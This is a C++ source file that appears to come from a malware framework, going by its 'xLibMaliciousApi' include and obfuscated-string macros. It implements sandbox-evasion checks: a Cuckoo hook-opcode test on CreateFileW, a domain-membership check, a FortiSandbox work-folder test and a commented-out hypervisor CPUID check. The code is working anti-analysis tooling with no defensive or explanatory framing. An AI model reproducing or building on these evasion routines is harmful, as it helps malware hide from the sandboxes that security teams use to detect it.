//
// skulk@ioc.ninja
//
#include "xSandboxDetection.h"

#include <intrin.h>

#include "xDynamicModule.h"
#include "xLibMaliciousApi.h"
#include "xOsApi.h"



bool xSandboxDetectionIsCuckoo()
{
	xDynamicModule mod(X_OBFUSCATED_STRING_W(L"Kernel32.dll"));

	void* pfn = mod.GetFunction(X_OBFUSCATED_STRING_A("CreateFileW"));

	// Detect Cuckoo hook opcode
	return pfn ? (*(uint8_t*) pfn == 0xe9) : false;
}

bool xSandboxDetectionIsDomainMember()
{
	bool result = false;

	DWORD size = 0;

	if (!X_KERNEL32_CALL(GetComputerNameExW)(ComputerNameDnsDomain, NULL, &size) &&  X_KERNEL32_CALL(GetLastError)() == ERROR_MORE_DATA)
	{
		wchar_t* domain = (wchar_t*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(size + sizeof(wchar_t));

		if (domain)
		{
			if (X_KERNEL32_CALL(GetComputerNameExW)(ComputerNameDnsDomain, domain, &size))
			{
				result = size > 0;
			}

			X_LIB_MALICIOUS_CALL(xMemoryFree)(domain);
		}
	}

	return result;
}

bool xSandboxDetectionIsFortiSandbox()
{
	const wchar_t* indicator = X_OBFUSCATED_STRING_W(L"C:\\Work");

	const DWORD fa = X_KERNEL32_CALL(GetFileAttributesW)(indicator);

	// Detect FortiSandbox work folder
	return ((fa != INVALID_FILE_ATTRIBUTES) && (fa & FILE_ATTRIBUTE_DIRECTORY));
}

bool xSandboxDetectionIsHypervisor()
{
	return false;
/*
	int32_t cpuInfo[4];

	__cpuid((int32_t*) cpuInfo, 1);

	// Check hypervisor bit
	return ((cpuInfo[2] >> 31) & 1) == 1;
*/
}
